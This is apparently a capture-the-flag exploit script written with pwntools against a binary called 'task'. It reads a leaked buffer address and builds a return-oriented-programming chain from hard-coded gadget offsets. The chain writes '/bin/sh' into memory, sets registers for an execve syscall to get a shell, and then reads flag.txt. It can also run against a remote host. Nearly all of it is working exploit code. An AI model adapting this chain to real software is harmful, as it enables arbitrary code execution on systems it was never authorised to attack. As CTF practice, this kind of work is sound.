from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)


p.sendline(b'15')
p.recvuntil(b'Buffer at: ')
code_addr = p.recvline().strip().decode()
code_addr = int(code_addr[2:], 16)
print(hex(code_addr))

# to spawn shell we need these register values
# RAX  0x3b
# RDX  0x0
# RDI  0x7fffffffe310 ◂— 0x68732f6e69622f /* '/bin/sh' */
# RSI  0x0
# SYS_execve(RDI, RSI, RAX)
# int execve(const char *pathname, char *const argv[], char *const envp[]);

# gadgets for seed 15
pop_rax = 0x000000000000515e # pop rax ; ret
pop_rcx = 0x0000000000005c2e # pop rcx ; ret
pop_rdi = 0x000000000000ea03 # pop rdi ; ret
pop_rdx = 0x0000000000000224 # pop rdx ; ret
syscall = 0x000000000000f7e6 # syscall

def pop_rsi(val):
	# 0x0000000000001167 # pop rsi ; pop rbx ; xchg eax, edi ; sub al, 0x57 ; fcmovu st(0), st(1) ; adc eax, esp ; ret
	return b''.join([
		t(0x0000000000001167),
		p64(val),
		p64(0x1337)
	])

write_mem = 0x000000000000df75 # xor dword ptr [rax - 0x41], ecx ; cwde ; adc al, 0x7b ; ret

def t(addr): return p64(code_addr + addr)

data = open("./data", "rb").read()

def unpack(d):
	return [u32(d[i:i+4].ljust(4, b'\x00')) for i in range(0, len(d), 4)]

vals = unpack(data)
cmd = unpack(b'/bin/sh\x00')

def store_dword(where, what):
	return b''.join([
		t(pop_rax),
		t(where),
		t(pop_rcx),
		p64(what),
		t(write_mem),
	])

rop = [
	b'A' * 0x10,

	# store /bin/sh
	store_dword(0x41, cmd[0] ^ vals[0]),
	store_dword(0x41 + 0x4, cmd[1] ^ vals[1]),

	# store argv array (NULL terminated)
	pop_rsi(0),

	t(pop_rdi),
	t(0),

	t(pop_rax),
	p64(0x3b),
	t(pop_rdx),
	p64(0),
	t(syscall)
]

p.sendline(b''.join(rop))

sleep(1.0)
p.sendline(b'cat flag.txt')
print(p.clean(0.5))

# p.interactive()
